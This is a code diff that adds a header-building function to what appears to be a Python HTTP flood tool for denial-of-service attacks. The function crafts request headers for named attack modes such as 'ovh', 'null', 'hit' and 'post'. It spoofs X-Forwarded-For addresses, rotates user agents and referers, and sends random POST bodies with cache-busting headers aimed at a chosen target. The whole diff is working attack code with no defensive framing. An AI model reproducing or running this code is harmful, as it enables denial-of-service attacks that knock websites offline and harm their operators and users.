@@ -55,6 +55,100 @@ def useragent_list():
 	
 
 ##################D1MOD FILE 
+def Headers(method):
+    header = ""
+    if method == "get" or method == "head":
+        connection = "Connection: Keep-Alive\r\n"
+        accept = Choice(acceptall) + "\r\n"
+        referer = "Referer: " + referers + target + path + "\r\n"
+        connection += "Cache-Control: max-age=0\r\n"
+        connection += "pragma: no-cache\r\n"
+        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+        useragent = "User-Agent: " + UserAgent + "\r\n"
+        header = referer + useragent + accept + connection + "\r\n\r\n"
+    elif method == "cookie":
+        connection = "Connection: Keep-Alive\r\n"
+        more = "cache-control: no-cache\r\n"
+        parm = "pragma: no-cache\r\n"
+        up = "upgrade-insecure-requests: 1"
+        connection += "Cookies: " + str(secrets.token_urlsafe(16)) + "\r\n"
+        accept = Choice(acceptall) + "\r\n"
+        referer = "Referer: " + referers + target + path + "\r\n"
+        useragent = "User-Agent: " + UserAgent + "\r\n"
+        header = referer + useragent + accept + connection + more + up + parm + "\r\n\r\n"
+    elif method == "brust":
+        connection = "Connection: Keep-Alive\r\n"
+        more = "Cache-Control: max-age=0\r\n"
+        more2 = "Via: 1.0 PROXY\r\n"
+        proxyd = str(proxy)
+        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
+        accept = "Accept: */*\r\n"
+        referer = "Referer: " + referers + target + path + "\r\n"
+        useragent = "User-Agent: " + UserAgent + "\r\n"
+        header = referer + useragent + accept + connection + more + xfor + more2 + "\r\n\r\n"
+    elif method == "even":
+        up = "Upgrade-Insecure-Requests: 1\r\n"
+        referer = "Referer: " + referers + target + path + "\r\n"
+        useragent = "User-Agent: " + UserAgent + "\r\n"
+        proxyd = str(proxy)
+        xfor = "X-Forwarded-For: " + proxyd + "\r\n"
+        header = referer + useragent + up + xfor + "\r\n\r\n"
+    elif method == "ovh":
+        accept = Choice(acceptall) + "\r\n"
+        more = "Connection: keep-alive\r\n"
+        connection = "Cache-Control: max-age=0\r\n"
+        connection += "pragma: no-cache\r\n"
+        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+        up = "Upgrade-Insecure-Requests: 1\r\n"
+        useragent = "User-Agent: " + UserAgent + "\r\n"
+        header = useragent + more + accept + up + "\r\n\r\n"
+    elif method == "pps":
+        header = "GET / HTTP/1.1\r\n\r\n"
+    elif method == "dyn":
+        connection = "Connection: Keep-Alive\r\n"
+        accept = Choice(acceptall) + "\r\n"
+        connection += "Cache-Control: max-age=0\r\n"
+        connection += "pragma: no-cache\r\n"
+        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+        referer = "Referer: " + referers + target + path + "\r\n"
+        useragent = "User-Agent: " + UserAgent + "\r\n"
+        header = referer + useragent + accept + connection + "\r\n\r\n"
+    elif method == "socket":
+        header = ""
+    elif method == "null":
+        connection = "Connection: null\r\n"
+        accept = Choice(acceptall) + "\r\n"
+        connection += "Cache-Control: max-age=0\r\n"
+        connection += "pragma: no-cache\r\n"
+        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+        referer = "Referer: null\r\n"
+        useragent = "User-Agent: null\r\n"
+        header = referer + useragent + accept + connection + "\r\n\r\n"
+    elif method == "post":
+        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
+        refer = "Referer: http://" + target + path + "\r\n"
+        user_agent = "User-Agent: " + UserAgent + "\r\n"
+        accept = Choice(acceptall) + "\r\n"
+        connection = "Cache-Control: max-age=0\r\n"
+        connection += "pragma: no-cache\r\n"
+        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+        data = str(random._urandom(8))
+        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
+        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
+    elif method == "hit":
+        post_host = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
+        content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
+        refer = "Referer: http://" + target + path + "\r\n"
+        user_agent = "User-Agent: " + UserAgent + "\r\n"
+        connection = "Cache-Control: max-age=0\r\n"
+        connection += "pragma: no-cache\r\n"
+        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
+        accept = Choice(acceptall) + "\r\n"
+        data = str(random._urandom(8))
+        length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
+        header = post_host + accept + connection + refer + content + user_agent + length + "\n" + data + "\r\n\r\n"
+    return header
 ##################################################################################################
 def run(self):
         while self.running:
